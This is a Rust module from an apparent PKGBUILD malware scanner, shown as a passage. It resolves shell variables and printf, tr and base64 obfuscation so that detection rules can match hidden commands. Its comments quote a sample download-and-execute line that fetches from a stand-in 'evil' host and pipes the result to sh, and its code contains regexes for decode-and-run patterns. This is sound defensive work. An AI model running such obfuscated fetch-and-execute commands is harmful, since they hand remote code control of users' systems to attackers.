//! Intra-PKGBUILD variable resolution (a lightweight, static taint pass).
//!
//! The detectors match shell text token-by-token, so a payload hidden behind a
//! shell variable evades every rule:
//! `x=curl; $x https://evil/p | sh` and `c=$(printf '\x63url'); $c …` "trip
//! nothing." There is no dataflow.
//!
//! This module closes that class by resolving **statically-evident** assignments
//! within a script and substituting the variable *uses* back to the value the
//! shell would expand, producing a normalized variant that every rule then sees.
//! It is the companion to the de-obfuscation pass ([`crate::textutil`]) and the
//! named prerequisite for the correlation engine: a re-spelled fetch/exec step
//! (`$x …| $y`) still maps to its capability.
//!
//! ## Safety / faithfulness (why this can't manufacture false positives)
//!
//! Like de-obfuscation, the resolved text is matched *in addition to* the raw
//! line, so resolution can only ever ADD a finding (close a false negative),
//! never suppress one. And it is **faithful**: a variable is resolved only to a
//! value the script itself assigned it from a static constant, so the resolved
//! line is exactly the command the shell would run -- no fabricated tokens.
//!
//! ## Conservatism (the FP discipline)
//!
//! * Nothing is ever executed. Command substitutions are resolved ONLY for the
//!   `$(printf …)`/`` `printf …` `` constant-format case, by decoding the format
//!   string -- never by running anything.
//! * Only variables assigned a static constant *in this text* enter the map; a
//!   variable we never saw assigned (e.g. makepkg's `$srcdir`/`$pkgver`) is left
//!   untouched, so ordinary build lines do not change.
//! * Known build variables (`pkgver`, `srcdir`, `CARGO_*`, …) are never tracked
//!   even when assigned, so legitimate packaging never gets rewritten.
//! * Resolution is single-pass and flow-ordered: a use resolves to the most
//!   recent prior assignment, matching shell evaluation order.

use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

use regex::Regex;

use crate::textutil::{
    logical_lines, normalize_shell_quoting, split_statements, split_words, BraceScanner,
};

/// Maximum length of a resolved value we will substitute. A bound against a
/// pathological accumulation (`v=$v$v…`) inflating a line; real command/URL
/// constants are short.
const MAX_VALUE_LEN: usize = 512;

/// Variable names we never resolve even if the script assigns them, because they
/// are makepkg/build-system controlled and resolving them only risks rewriting
/// legitimate packaging lines (`cd "$srcdir/$pkgname-$pkgver"`). Matched
/// case-sensitively; the `CARGO_`/`CFLAGS`-style env vars are handled by
/// [`is_build_var`] via a prefix/upper-case rule.
const BUILD_VARS: &[&str] = &[
    "pkgname",
    "pkgbase",
    "pkgver",
    "pkgrel",
    "epoch",
    "pkgdir",
    "srcdir",
    "startdir",
    "builddir",
    "CARCH",
    "CHOST",
    "MAKEFLAGS",
    "DESTDIR",
    "GOPATH",
    "HOME",
    "PATH",
    "PREFIX",
    "srcdir",
];

/// True for a variable name we must not resolve: a known build var, or an
/// ALL-CAPS env-style name (`CARGO_*`, `CFLAGS`, `LDFLAGS`, `RUSTFLAGS`, …).
/// Upper-case names are overwhelmingly build/env configuration, not the
/// short lowercase aliases (`x`, `c`, `cmd`) malware uses to indirect a command.
fn is_build_var(name: &str) -> bool {
    if BUILD_VARS.contains(&name) {
        return true;
    }
    // ALL-CAPS (with digits/underscores) -> env/build configuration. Requires at
    // least one letter so a numeric token isn't misclassified.
    name.chars().any(|c| c.is_ascii_alphabetic())
        && name
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

/// An assignment at command position: optional leading whitespace / `;` / `&&` /
/// `||` / `(` then `NAME=` then the rest of the (logical) line as the RHS. We
/// deliberately accept only a *leading* assignment (not one buried mid-command,
/// which bash treats as a per-command environment, e.g. `FOO=bar cmd`) by
/// anchoring at the start; `export`/`local`/`declare`/`readonly` prefixes are
/// stripped by [`strip_decl_prefix`] before matching.
static ASSIGN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)(\+?)=(.*)$").unwrap());

/// A `$(printf 'FMT' …)` or `` `printf 'FMT'` `` command substitution whose
/// format is a single-quoted (or unquoted) constant. Captures the format string.
/// Only `printf` is resolved -- it produces output purely from its constant
/// arguments, so decoding it executes nothing.
static PRINTF_SUBST_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^\$\(\s*printf\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\)$|^`\s*printf\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*`$"#)
        .unwrap()
});

/// Strip a leading `export`/`local`/`declare`/`readonly`/`typeset` keyword (and
/// any `-x`-style flags) so `export x=curl` is seen as the assignment `x=curl`.
fn strip_decl_prefix(line: &str) -> &str {
    let mut s = line.trim_start();
    loop {
        let mut advanced = false;
        for kw in ["export", "local", "declare", "readonly", "typeset"] {
            if let Some(rest) = s.strip_prefix(kw) {
                if let Some(after) = rest.strip_prefix(char::is_whitespace) {
                    s = after.trim_start();
                    advanced = true;
                    // skip leading -flags (declare -x, local -r, …)
                    while let Some(flag_rest) = s.strip_prefix('-') {
                        let end = flag_rest
                            .find(char::is_whitespace)
                            .map(|i| i + 1)
                            .unwrap_or(flag_rest.len());
                        s = flag_rest[end..].trim_start();
                        let _ = flag_rest;
                    }
                    break;
                }
            }
        }
        if !advanced {
            break;
        }
    }
    s
}

/// Decode a `printf` constant format string the way `printf` would expand its
/// backslash escapes: `\xHH` (hex), `\NNN`/`\0NNN` (octal), and the common C
/// controls. Returns the decoded bytes as a string. `%`-directives are left
/// as-is (no arguments are consumed/evaluated). This executes nothing -- it is a
/// pure constant fold of `printf '\x63url'` -> `curl`.
fn decode_printf_format(fmt: &str) -> String {
    let chars: Vec<char> = fmt.chars().collect();
    let mut out = String::with_capacity(fmt.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() {
            match chars[i + 1] {
                'x' => {
                    let hex: String = chars[i + 2..]
                        .iter()
                        .take(2)
                        .take_while(|c| c.is_ascii_hexdigit())
                        .collect();
                    if hex.is_empty() {
                        out.push('x');
                        i += 2;
                    } else {
                        if let Some(ch) =
                            u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32)
                        {
                            out.push(ch);
                        }
                        i += 2 + hex.len();
                    }
                }
                '0'..='7' => {
                    let oct: String = chars[i + 1..]
                        .iter()
                        .take(3)
                        .take_while(|c| c.is_digit(8))
                        .collect();
                    if let Some(ch) = u32::from_str_radix(&oct, 8).ok().and_then(char::from_u32) {
                        out.push(ch);
                    }
                    i += 1 + oct.len();
                }
                'n' => {
                    out.push('\n');
                    i += 2;
                }
                't' => {
                    out.push('\t');
                    i += 2;
                }
                'r' => {
                    out.push('\r');
                    i += 2;
                }
                '\\' => {
                    out.push('\\');
                    i += 2;
                }
                other => {
                    out.push(other);
                    i += 2;
                }
            }
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// Resolve an assignment's right-hand side to a static constant value, or `None`
/// if it is not statically evident (references an unknown command-substitution, a
/// still-unresolved variable, etc.). `vars` is the map of already-resolved
/// variables so chained constant assignments (`a=cur; b=${a}l`) resolve.
fn resolve_rhs(
    rhs: &str,
    vars: &HashMap<String, String>,
    unset: &HashSet<String>,
) -> Option<String> {
    let rhs = rhs.trim();
    if rhs.is_empty() {
        return Some(String::new());
    }
    // A printf command-substitution constant: decode its format, execute nothing.
    if let Some(caps) = PRINTF_SUBST_RE.captures(rhs) {
        let fmt = (1..=6).find_map(|i| caps.get(i)).map(|m| m.as_str())?;
        let decoded = decode_printf_format(fmt);
        return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
    }
    // Substitute any already-known variables (and fold the constant command
    // substitutions we understand), then strip the quoting the shell would (so
    // `"cu""rl"`, `$'\x63'url`, `'curl'` all fold to the literal word).
    let substituted = substitute_vars(rhs, vars, unset);
    // Any other command substitution / backtick is not statically resolvable.
    if substituted.contains("$(") || substituted.contains('`') {
        return None;
    }
    let normalized = normalize_shell_quoting(&substituted);
    // If a `$`-expansion of an UNKNOWN variable remains, the value is not fully
    // static -- refuse rather than emit a half-resolved token.
    if normalized.contains('$') {
        return None;
    }
    (normalized.len() <= MAX_VALUE_LEN).then_some(normalized)
}

/// Matches a variable use. Braced forms capture an optional `!`/`#` prefix, the
/// name, an optional `[subscript]` and whatever operator text follows up to the
/// first `}` (`${x:1:3}`, `${x//a/b}`, `${x:-d}`); the rest are `$name`, the
/// positional `${1}`/`$1` and `$@`/`$*`. The captured name is a full identifier
/// so `$vx` is not a use of `$v`.
static USE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\$\{([!#]?)([A-Za-z_][A-Za-z0-9_]*)(?:\[([^\]]*)\])?([^}]*)\}|\$\{([0-9]+|[@*])\}|\$([A-Za-z_][A-Za-z0-9_]*)|\$([0-9@*])",
    )
    .unwrap()
});

/// Key under which `IFS` is tracked. A plain `IFS` key would be substituted by
/// the `$IFS` use handling, so it lives under a name no script can spell.
const IFS_KEY: &str = "\u{0}IFS";
/// Prefix of the alias table inside the variable map.
const ALIAS_PREFIX: &str = "\u{0}alias:";

/// How far from its opener `fold_substitutions` looks for a substitution's
/// closer (bodies longer than [`MAX_ENCODED_LEN`] are never folded anyway), and
/// the total scan steps it may spend on one line.
const FOLD_WINDOW: usize = MAX_ENCODED_LEN + 2;
const FOLD_WORK_BUDGET: usize = 64 * 1024;

/// Most array elements we track individually.
const MAX_ARRAY_ELEMS: usize = 32;

/// Names that appear in `content` only as `$name` / `${name…}` uses and never
/// anywhere else (no `name=`, `read name`, `for name`, `printf -v name`, …), and
/// that are not build/env style names. A use of such a variable expands to the
/// empty string, so `n${zz}pm` is `npm`.
fn unset_names(content: &str) -> HashSet<String> {
    static IDENT_RE: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"[A-Za-z_][A-Za-z0-9_]*").unwrap());
    let bytes = content.as_bytes();
    let mut elsewhere: HashSet<&str> = HashSet::new();
    let mut used: HashSet<&str> = HashSet::new();
    for m in IDENT_RE.find_iter(content) {
        let s = m.start();
        let prev = if s > 0 { bytes[s - 1] } else { 0 };
        let is_use = prev == b'$'
            || (prev == b'{' && s > 1 && bytes[s - 2] == b'$')
            || (matches!(prev, b'!' | b'#')
                && s > 2
                && bytes[s - 2] == b'{'
                && bytes[s - 3] == b'$');
        if is_use {
            used.insert(m.as_str());
        } else {
            elsewhere.insert(m.as_str());
        }
    }
    used.into_iter()
        .filter(|n| !elsewhere.contains(n) && !is_build_var(n))
        .map(str::to_string)
        .collect()
}

/// Expand a character class-free shell glob (`*`, `?`, literals) into an
/// anchored-by-the-caller regex. `[...]` classes are not modelled: `None`.
fn glob_to_regex(pat: &str) -> Option<Regex> {
    let mut re = String::new();
    for c in pat.chars() {
        match c {
            '*' => re.push_str(".*"),
            '?' => re.push('.'),
            '[' | ']' => return None,
            c => re.push_str(&regex::escape(&c.to_string())),
        }
    }
    Regex::new(&re).ok()
}

/// Apply `${v#p}`, `${v##p}`, `${v%p}`, `${v%%p}`.
fn strip_affix(v: &str, pat: &str, prefix: bool, longest: bool) -> Option<String> {
    let re = glob_to_regex(pat)?;
    let full = Regex::new(&format!("^(?:{})$", re.as_str())).ok()?;
    let cuts: Vec<usize> = v
        .char_indices()
        .map(|(i, _)| i)
        .chain(std::iter::once(v.len()))
        .collect();
    if prefix {
        let order: Box<dyn Iterator<Item = &usize>> = if longest {
            Box::new(cuts.iter().rev())
        } else {
            Box::new(cuts.iter())
        };
        for &k in order {
            if full.is_match(&v[..k]) {
                return Some(v[k..].to_string());
            }
        }
    } else {
        let order: Box<dyn Iterator<Item = &usize>> = if longest {
            Box::new(cuts.iter())
        } else {
            Box::new(cuts.iter().rev())
        };
        for &k in order {
            if full.is_match(&v[k..]) {
                return Some(v[..k].to_string());
            }
        }
    }
    Some(v.to_string())
}

/// `${v:off}` / `${v:off:len}` over characters, with bash's negative-offset and
/// negative-length rules.
fn substring(v: &str, spec: &str) -> Option<String> {
    let chars: Vec<char> = v.chars().collect();
    // i128 holds any i64 sum, so no operand can overflow.
    let n = chars.len() as i128;
    let (off_s, len_s) = match spec.split_once(':') {
        Some((o, l)) => (o, Some(l)),
        None => (spec, None),
    };
    let off = i128::from(off_s.trim().parse::<i64>().ok()?);
    let start = if off < 0 {
        (n + off).max(0)
    } else {
        off.min(n)
    };
    let end = match len_s {
        None => n,
        Some(l) => {
            let l = i128::from(l.trim().parse::<i64>().ok()?);
            if l < 0 {
                (n + l).max(start)
            } else {
                (start + l).min(n)
            }
        }
    }
    .clamp(start, n);
    Some(chars[start as usize..end as usize].iter().collect())
}

/// Split `a/b` on the first unescaped `/`.
fn split_replace(spec: &str) -> (String, String) {
    let mut pat = String::new();
    let mut it = spec.chars().peekable();
    while let Some(c) = it.next() {
        if c == '\\' {
            if let Some(n) = it.next() {
                pat.push(n);
            }
        } else if c == '/' {
            return (pat, it.collect());
        } else {
            pat.push(c);
        }
    }
    (pat, String::new())
}

/// Evaluate a braced parameter expansion with an operator against a known (or
/// known-empty) value. `None` when the operator is not modelled.
fn apply_operator(
    val: Option<String>,
    op: &str,
    vars: &HashMap<String, String>,
    unset: &HashSet<String>,
    _known_unset: bool,
) -> Option<String> {
    // Operator arguments may themselves be quoted / carry variables.
    let arg = |raw: &str| -> Option<String> {
        // Plain `$name` uses only: a nested `${…}` / `$(…)` argument would
        // recurse (`${a:-${a:-…}}`, thousands deep) for no gain.
        if raw.contains("${") || raw.contains("$(") || raw.contains('`') {
            return None;
        }
        let s = normalize_shell_quoting(&substitute_vars(raw, vars, unset));
        (!s.contains('$') && !s.contains('`')).then_some(s)
    };
    let is_set = val.is_some();
    let v = val.unwrap_or_default();
    if let Some(d) = op.strip_prefix(":-").or_else(|| op.strip_prefix(":=")) {
        return if v.is_empty() { arg(d) } else { Some(v) };
    }
    if let Some(d) = op.strip_prefix('-').or_else(|| op.strip_prefix('=')) {
        return if is_set { Some(v) } else { arg(d) };
    }
    if let Some(d) = op.strip_prefix(":+") {
        return if v.is_empty() {
            Some(String::new())
        } else {
            arg(d)
        };
    }
    if let Some(spec) = op.strip_prefix("//") {
        let (pat, rep) = split_replace(spec);
        if pat.is_empty() {
            return Some(v);
        }
        let re = glob_to_regex(&arg(&pat)?)?;
        let rep = arg(&rep)?;
        return Some(re.replace_all(&v, regex::NoExpand(&rep)).into_owned());
    }
    if let Some(spec) = op.strip_prefix('/') {
        if spec.starts_with(['#', '%']) {
            return None;
        }
        let (pat, rep) = split_replace(spec);
        if pat.is_empty() {
            return Some(v);
        }
        let re = glob_to_regex(&arg(&pat)?)?;
        let rep = arg(&rep)?;
        return Some(re.replacen(&v, 1, regex::NoExpand(&rep)).into_owned());
    }
    if let Some(p) = op.strip_prefix("##") {
        return strip_affix(&v, &arg(p)?, true, true);
    }
    if let Some(p) = op.strip_prefix('#') {
        return strip_affix(&v, &arg(p)?, true, false);
    }
    if let Some(p) = op.strip_prefix("%%") {
        return strip_affix(&v, &arg(p)?, false, true);
    }
    if let Some(p) = op.strip_prefix('%') {
        return strip_affix(&v, &arg(p)?, false, false);
    }
    match op {
        ",," => return Some(v.to_lowercase()),
        "^^" => return Some(v.to_uppercase()),
        "," | "^" => {
            let mut cs = v.chars();
            let first = cs.next();
            let head = first.map(|c| {
                if op == "," {
                    c.to_lowercase().to_string()
                } else {
                    c.to_uppercase().to_string()
                }
            });
            return Some(head.unwrap_or_default() + cs.as_str());
        }
        _ => {}
    }
    if let Some(spec) = op.strip_prefix(':') {
        return substring(&v, spec);
    }
    None
}

/// Look up `name` (optionally subscripted) in the tracked variables.
fn lookup_var(vars: &HashMap<String, String>, name: &str, idx: Option<&str>) -> Option<String> {
    match idx {
        None => vars.get(name).cloned(),
        Some("@") => vars.get(&format!("{name}[@]")).cloned(),
        Some("*") => {
            if vars.get(IFS_KEY).is_some_and(String::is_empty) {
                let n: usize = vars.get(&format!("{name}[#]"))?.parse().ok()?;
                (0..n)
                    .map(|i| vars.get(&format!("{name}[{i}]")).cloned())
                    .collect::<Option<Vec<_>>>()
                    .map(|e| e.concat())
            } else {
                vars.get(&format!("{name}[@]")).cloned()
            }
        }
        Some(i) if i.chars().all(|c| c.is_ascii_digit()) && !i.is_empty() => {
            vars.get(&format!("{name}[{i}]")).cloned()
        }
        Some(_) => None,
    }
}

/// True when the character just before `start`, or just after `end`, belongs to
/// the same shell word as the expansion (a letter, digit or `_`).
fn glued_to_word(line: &str, start: usize, end: usize) -> bool {
    let word = |c: char| c.is_ascii_alphanumeric() || c == '_';
    // A quote pair around the expansion does not end the word: `n"$zz"pm`.
    let before = &line[..start];
    let before = before.strip_suffix(['"', '\'']).unwrap_or(before);
    let after = &line[end..];
    let after = after.strip_prefix(['"', '\'']).unwrap_or(after);
    before.chars().next_back().is_some_and(word) || after.chars().next().is_some_and(word)
}

/// Replace every resolvable `$v` / `${v}` / `${!v}` / `${v[@]}` / `${v[N]}` /
/// `${v<operator>…}` in `line` with its value from `vars`, then fold the
/// constant command substitutions we understand. Unknown variables are left
/// verbatim, except a variable that is never assigned anywhere in the package
/// (`unset`) used INSIDE a word, which expands to nothing (`n${zz}pm`). `${!v}`
/// is one extra hop: the value of `v` is itself treated as a variable name.
fn substitute_vars(line: &str, vars: &HashMap<String, String>, unset: &HashSet<String>) -> String {
    let replaced = USE_RE.replace_all(line, |caps: &regex::Captures| {
        let whole = caps.get(0).unwrap();
        let verbatim = || whole.as_str().to_string();
        // Positional parameters and `$@`/`$*`.
        if let Some(p) = caps.get(5).or_else(|| caps.get(7)) {
            return vars.get(p.as_str()).cloned().unwrap_or_else(verbatim);
        }
        // Plain `$name`.
        if let Some(n) = caps.get(6) {
            let name = n.as_str();
            return match vars.get(name) {
                Some(v) => v.clone(),
                None if unset.contains(name) && glued_to_word(line, whole.start(), whole.end()) => {
                    String::new()
                }
                None => verbatim(),
            };
        }
        let prefix = &caps[1];
        let name = &caps[2];
        let idx = caps.get(3).map(|m| m.as_str());
        let op = &caps[4];
        if prefix == "#" {
            return verbatim();
        }
        if prefix == "!" {
            // ${!name}: resolve name -> inner var name -> its value.
            if idx.is_some() || !op.is_empty() {
                return verbatim();
            }
            return vars
                .get(name)
                .and_then(|inner| vars.get(inner))
                .cloned()
                .unwrap_or_else(verbatim);
        }
        let val = lookup_var(vars, name, idx);
        let known_unset =
            val.is_none() && idx.is_none() && unset.contains(name) && !vars.contains_key(name);
        if op.is_empty() {
            return match val {
                Some(v) => v,
                None if known_unset && glued_to_word(line, whole.start(), whole.end()) => {
                    String::new()
                }
                None => verbatim(),
            };
        }
        if val.is_none() && !known_unset {
            return verbatim();
        }
        match apply_operator(val, op, vars, unset, known_unset) {
            Some(v) if v.len() <= MAX_VALUE_LEN => v,
            _ => verbatim(),
        }
    });
    fold_substitutions(&replaced)
}

/// Argument words of a simple command, quote-normalized.
fn norm_words(words: &[String]) -> Vec<String> {
    words.iter().map(|w| normalize_shell_quoting(w)).collect()
}

/// `printf FMT [ARG…]` evaluated purely: backslash escapes decoded, `%s`/`%b`
/// filled from the arguments, `%%` collapsed. Any other directive: `None`.
fn fold_printf(words: &[String]) -> Option<String> {
    let mut i = 1;
    if words.get(i).map(String::as_str) == Some("--") {
        i += 1;
    }
    let raw_fmt = words.get(i)?;
    let fmt = if let Some(inner) = raw_fmt
        .strip_prefix('\'')
        .and_then(|r| r.strip_suffix('\''))
        .or_else(|| raw_fmt.strip_prefix('"').and_then(|r| r.strip_suffix('"')))
    {
        inner.to_string()
    } else {
        raw_fmt.clone()
    };
    let args = norm_words(&words[i + 1..]);
    let decoded = decode_printf_format(&fmt);
    let slots = decoded.matches("%s").count() + decoded.matches("%b").count();
    // Only `%s`, `%b` and `%%` directives are modelled.
    if decoded.replace("%%", "").matches('%').count() != slots
        || args.len() > slots.max(1) && slots > 0
    {
        return None;
    }
    let mut out = String::new();
    let mut arg_it = args.iter();
    let cs: Vec<char> = decoded.chars().collect();
    let mut k = 0;
    while k < cs.len() {
        if cs[k] == '%' {
            match cs.get(k + 1) {
                Some('%') => out.push('%'),
                Some('s') | Some('b') => {
                    out.push_str(arg_it.next().map(String::as_str).unwrap_or(""))
                }
                _ => return None,
            }
            k += 2;
        } else {
            out.push(cs[k]);
            k += 1;
        }
    }
    (out.len() <= MAX_VALUE_LEN).then_some(out)
}

/// Expand `a-z` style ranges of a `tr` set.
fn tr_set(spec: &str) -> Option<Vec<char>> {
    let cs: Vec<char> = spec.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < cs.len() {
        if cs[i] == '[' || cs[i] == '\\' {
            return None;
        }
        if i + 2 < cs.len() && cs[i + 1] == '-' {
            let (a, b) = (cs[i] as u32, cs[i + 2] as u32);
            if a > b || b - a > 256 {
                return None;
            }
            out.extend((a..=b).filter_map(char::from_u32));
            i += 3;
        } else {
            out.push(cs[i]);
            i += 1;
        }
    }
    Some(out)
}

/// `tr SET1 SET2` / `tr -d SET` over `input`.
fn fold_tr(args: &[String], input: &str) -> Option<String> {
    let args = norm_words(args);
    match args.as_slice() {
        [d, set] if d == "-d" => {
            let set = tr_set(set)?;
            Some(input.chars().filter(|c| !set.contains(c)).collect())
        }
        [s1, s2] if !s1.starts_with('-') => {
            let (s1, s2) = (tr_set(s1)?, tr_set(s2)?);
            let last = *s2.last()?;
            Some(
                input
                    .chars()
                    .map(|c| match s1.iter().position(|x| *x == c) {
                        Some(p) => *s2.get(p).unwrap_or(&last),
                        None => c,
                    })
                    .collect(),
            )
        }
        _ => None,
    }
}

/// The text a command substitution body prints, for the shapes that can be
/// evaluated without running anything: `printf …`, `echo …`, optionally piped
/// through `tr`. `None` for everything else.
fn fold_command(body: &str) -> Option<String> {
    let body = body.trim();
    if body.len() > MAX_ENCODED_LEN || body.contains(['\n', ';', '&', '>']) {
        return None;
    }
    // Split the (single) pipeline on top-level `|`.
    let stages = split_pipeline(body)?;
    let mut text = fold_producer(split_words(stages.first()?).as_slice())?;
    for stage in &stages[1..] {
        let w = split_words(stage);
        if w.first().map(String::as_str) != Some("tr") {
            return None;
        }
        // `tr A B <<< word` supplies its own input.
        let (args, here) = match w.iter().position(|x| x == "<<<") {
            Some(p) => (&w[1..p], Some(norm_words(&w[p + 1..]).join(" "))),
            None => (&w[1..], None),
        };
        text = fold_tr(args, here.as_deref().unwrap_or(&text))?;
    }
    (text.len() <= MAX_VALUE_LEN).then_some(text)
}

/// First stage of a substitution: `echo`/`printf`, or `tr` with `<<<` input.
fn fold_producer(words: &[String]) -> Option<String> {
    match words.first().map(String::as_str)? {
        "printf" => fold_printf(words),
        "echo" => {
            let mut rest = &words[1..];
            while rest.first().is_some_and(|w| w == "-n") {
                rest = &rest[1..];
            }
            if rest.first().is_some_and(|w| w.starts_with('-')) {
                return None;
            }
            Some(norm_words(rest).join(" "))
        }
        "tr" => {
            let p = words.iter().position(|x| x == "<<<")?;
            let input = norm_words(&words[p + 1..]).join(" ");
            fold_tr(&words[1..p], &input)
        }
        _ => None,
    }
}

/// Split on `|` outside quotes; `None` on `||` or anything exotic.
fn split_pipeline(body: &str) -> Option<Vec<String>> {
    let mut out = vec![String::new()];
    let (mut sq, mut dq) = (false, false);
    let cs: Vec<char> = body.chars().collect();
    let mut i = 0;
    while i < cs.len() {
        let c = cs[i];
        match c {
            '\'' if !dq => sq = !sq,
            '"' if !sq => dq = !dq,
            '$' | '`' if !sq => return None,
            '|' if !sq && !dq => {
                if cs.get(i + 1) == Some(&'|') {
                    return None;
                }
                out.push(String::new());
                i += 1;
                continue;
            }
            _ => {}
        }
        out.last_mut()?.push(c);
        i += 1;
    }
    Some(out)
}

/// Replace `$( … )` and `` `…` `` substitutions we can evaluate statically with
/// the text they print. Only used where the result is free of quote/escape
/// characters, so splicing it cannot change how the surrounding line parses.
fn fold_substitutions(line: &str) -> String {
    if !line.contains("$(") && !line.contains('`') {
        return line.to_string();
    }
    let cs: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut i = 0;
    let (mut sq, mut dq) = (false, false);
    // Work budget: each candidate looks for its closer inside a bounded window,
    // and the scan steps of the whole line are capped. Nested `$($($(…` would
    // otherwise rescan the rest of the line from every opener (quadratic). Past
    // the budget the remainder is kept verbatim: this is an extra variant, so
    // stopping early can only lose a fold, never hide anything.
    let mut budget = FOLD_WORK_BUDGET;
    while i < cs.len() {
        if budget == 0 {
            out.extend(&cs[i..]);
            break;
        }
        let c = cs[i];
        // Quote state: a `'` inside "…" (or a `"` inside '…') is literal, and a
        // backslash outside single quotes escapes the next character.
        if c == '\\' && !sq && i + 1 < cs.len() {
            out.push(c);
            out.push(cs[i + 1]);
            i += 2;
            continue;
        }
        if c == '\'' && !dq {
            sq = !sq;
        } else if c == '"' && !sq {
            dq = !dq;
        }
        let close = if sq {
            None
        } else if c == '$' && cs.get(i + 1) == Some(&'(') && cs.get(i + 2) != Some(&'(') {
            let mut depth = 1;
            let mut j = i + 2;
            let limit = (i + 2 + FOLD_WINDOW).min(cs.len());
            let (mut isq, mut idq) = (false, false);
            while j < limit && depth > 0 {
                budget = budget.saturating_sub(1);
                match cs[j] {
                    '\'' if !idq => isq = !isq,
                    '"' if !isq => idq = !idq,
                    '(' if !isq && !idq => depth += 1,
                    ')' if !isq && !idq => depth -= 1,
                    _ => {}
                }
                j += 1;
            }
            (depth == 0).then_some((i + 2, j - 1, j))
        } else if c == '`' {
            let limit = (i + 1 + FOLD_WINDOW).min(cs.len());
            budget = budget.saturating_sub(limit - i);
            cs[i + 1..limit]
                .iter()
                .position(|&x| x == '`')
                .map(|p| (i + 1, i + 1 + p, i + 2 + p))
        } else {
            None
        };
        if let Some((bs, be, next)) = close {
            let body: String = cs[bs..be].iter().collect();
            if let Some(v) = fold_command(&body) {
                if !v.contains(['\'', '"', '\\', '$', '`', '\n']) {
                    out.push_str(&v);
                    i = next;
                    continue;
                }
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// `${IFS}` / `$IFS` / `${IFS%?}` / `$IFS$9` used as a word separator: the shell
/// expands every one of these to whitespace, so for matching they are a space.
static IFS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{IFS[^}]*\}(?:\$\d|\$\{\d\})?|\$IFS(?:\$\d|\$\{\d\})?").unwrap()
});

/// Leading control words that can precede an assignment statement
/// (`then c=curl`, `{ c=curl`, `do x=1`).
static CTRL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^(?:then|do|else|\{|\(|!)\s+").unwrap());

static FN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(?:function\s+)?[A-Za-z_][A-Za-z0-9_:-]*\s*\(\s*\)\s*\{?|^\s*function\s+[A-Za-z_][A-Za-z0-9_:-]*\s*\{?")
        .unwrap()
});

/// Upper bound on the size of an inline-encoded literal we will decode, and on
/// the decoded text we will splice back into a line.
const MAX_ENCODED_LEN: usize = 4096;
const MAX_DECODED_LEN: usize = 2048;

static B64_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)(?:echo|printf)(?:\s+-[A-Za-z]+)*\s+(?:'%s'\s+|"%s"\s+|%s\s+)?['"]?([A-Za-z0-9+/]{8,4096}={0,2})['"]?\s*\|\s*(?:openssl\s+(?:enc\s+)?)?base64\s+(?:-[a-z]*d[a-z]*|--decode)\b"#,
    )
    .unwrap()
});
static B64_HERE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)base64\s+(?:-[a-z]*d[a-z]*|--decode)\s*<<<\s*['"]?([A-Za-z0-9+/]{8,4096}={0,2})['"]?"#,
    )
    .unwrap()
});
static HEX_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)(?:echo|printf)(?:\s+-[A-Za-z]+)*\s+['"]?([0-9a-f]{8,4096})['"]?\s*\|\s*xxd\s+-r\s*-?p(?:s)?\b"#,
    )
    .unwrap()
});
static PRINTF_ESC_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"printf\s+(?:-\S+\s+)*'((?:[^'\\]|\\.){4,4096})'\s*\|"#).unwrap()
});
static ESC_COUNT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\x[0-9A-Fa-f]{2}|\\[0-7]{3}").unwrap());

/// Accept decoded bytes only when they are short, valid UTF-8 and overwhelmingly
/// printable (a decoded binary blob is not a command line). Newlines become
/// `; ` so the spliced text stays on one logical line (line numbers are kept).
fn accept_decoded(bytes: Vec<u8>) -> Option<String> {
    let text = String::from_utf8(bytes).ok()?;
    let total = text.chars().count();
    if total == 0 || text.len() > MAX_DECODED_LEN {
        return None;
    }
    let bad = text
        .chars()
        .filter(|c| !(c.is_whitespace() || (' '..='~').contains(c)))
        .count();
    if bad * 10 > total {
        return None;
    }
    Some(text.trim().replace('\r', "").replace('\n', "; "))
}

fn decode_b64(lit: &str) -> Option<String> {
    use base64::engine::general_purpose::{GeneralPurpose, GeneralPurposeConfig};
    use base64::engine::DecodePaddingMode;
    use base64::Engine;
    if lit.len() > MAX_ENCODED_LEN {
        return None;
    }
    let engine = GeneralPurpose::new(
        &base64::alphabet::STANDARD,
        GeneralPurposeConfig::new().with_decode_padding_mode(DecodePaddingMode::Indifferent),
    );
    accept_decoded(engine.decode(lit).ok()?)
}

#[allow(clippy::manual_is_multiple_of)] // is_multiple_of needs Rust 1.87; MSRV is 1.85
fn decode_hex(lit: &str) -> Option<String> {
    if lit.len() > MAX_ENCODED_LEN || lit.len() % 2 != 0 {
        return None;
    }
    let bytes: Option<Vec<u8>> = (0..lit.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&lit[i..i + 2], 16).ok())
        .collect();
    accept_decoded(bytes?)
}

/// Splice short inline-encoded payloads back as the text they decode to:
/// `echo <b64> | base64 -d`, `base64 -d <<< <b64>`, `echo <hex> | xxd -r -p` and
/// `printf '\x63\x75…' |` become their decoded command text, so every rule sees
/// the specific command the encoding hides (a decoded `curl … | sh` trips the
/// download-and-execute rules, not just the generic decode->execute heuristic).
